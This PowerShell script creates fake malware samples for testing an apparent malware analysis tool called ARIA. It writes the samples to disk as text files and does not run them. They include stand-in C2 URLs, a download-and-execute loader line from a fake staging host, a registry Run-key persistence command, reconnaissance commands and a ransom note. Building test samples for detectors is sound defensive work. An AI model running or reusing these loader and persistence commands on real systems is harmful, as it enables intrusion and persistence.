# Creates test malware samples for ARIA analysis testing
# Run from C:\ARIA: powershell -ExecutionPolicy Bypass -File test_samples\create_test_samples.ps1

$dir = "C:\ARIA\incoming"
New-Item -ItemType Directory -Force -Path $dir | Out-Null

# Sample 1: Fake suspicious PE with malware-like strings
$suspicious = @"
MZ This program cannot be run in DOS mode.
PE
CreateRemoteThread
VirtualAllocEx
WriteProcessMemory
NtUnmapViewOfSection
http://evil-c2-server.com/payload.bin
http://185.234.72.10/gate.php
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
powershell -encodedcommand JABjAGwAaQBlAG4AdAA=
cmd.exe /c whoami > C:\temp\recon.txt
net user /domain
GetAsyncKeyState
IsDebuggerPresent
SetWindowsHookExA
CryptEncrypt
WinHttpConnect
BitBlt
kernel32.dll
ntdll.dll
advapi32.dll
ws2_32.dll
"@
[System.IO.File]::WriteAllText("$dir\suspicious_dropper.exe", $suspicious)
Write-Host "Created: suspicious_dropper.exe" -ForegroundColor Green

# Sample 2: Clean-looking text file (should score low)
$clean = "This is a normal document with no suspicious content."
[System.IO.File]::WriteAllText("$dir\normal_doc.txt", $clean)
Write-Host "Created: normal_doc.txt" -ForegroundColor Green

# Sample 3: Fake ransomware note
$ransom = @"
YOUR FILES HAVE BEEN ENCRYPTED
All your documents, photos, databases and other important files have been encrypted.
Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Contact: decrypt0r@protonmail.com
Your personal ID: AX7-KQ9-MN2-ZP4
Do not attempt to decrypt files using third party software.
"@
[System.IO.File]::WriteAllText("$dir\DECRYPT_README.txt", $ransom)
Write-Host "Created: DECRYPT_README.txt" -ForegroundColor Green

# Sample 4: Obfuscated PowerShell script
$ps1 = @"
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
iex ((New-Object System.Net.WebClient).DownloadString('http://malware-staging.com/loader.ps1'))
Invoke-Expression (Get-Content C:\temp\encoded.b64 | ConvertFrom-Base64)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -enc JABzAD0A"
"@
[System.IO.File]::WriteAllText("$dir\update_checker.ps1", $ps1)
Write-Host "Created: update_checker.ps1" -ForegroundColor Green

# Sample 5: Copy a real system exe for clean baseline
Copy-Item "C:\Windows\System32\whoami.exe" "$dir\whoami_copy.exe" -Force -ErrorAction SilentlyContinue
Write-Host "Created: whoami_copy.exe (real system binary)" -ForegroundColor Green

Write-Host ""
Write-Host "Test samples ready in $dir" -ForegroundColor Cyan
Write-Host "Upload them at http://localhost:5000/test" -ForegroundColor Cyan
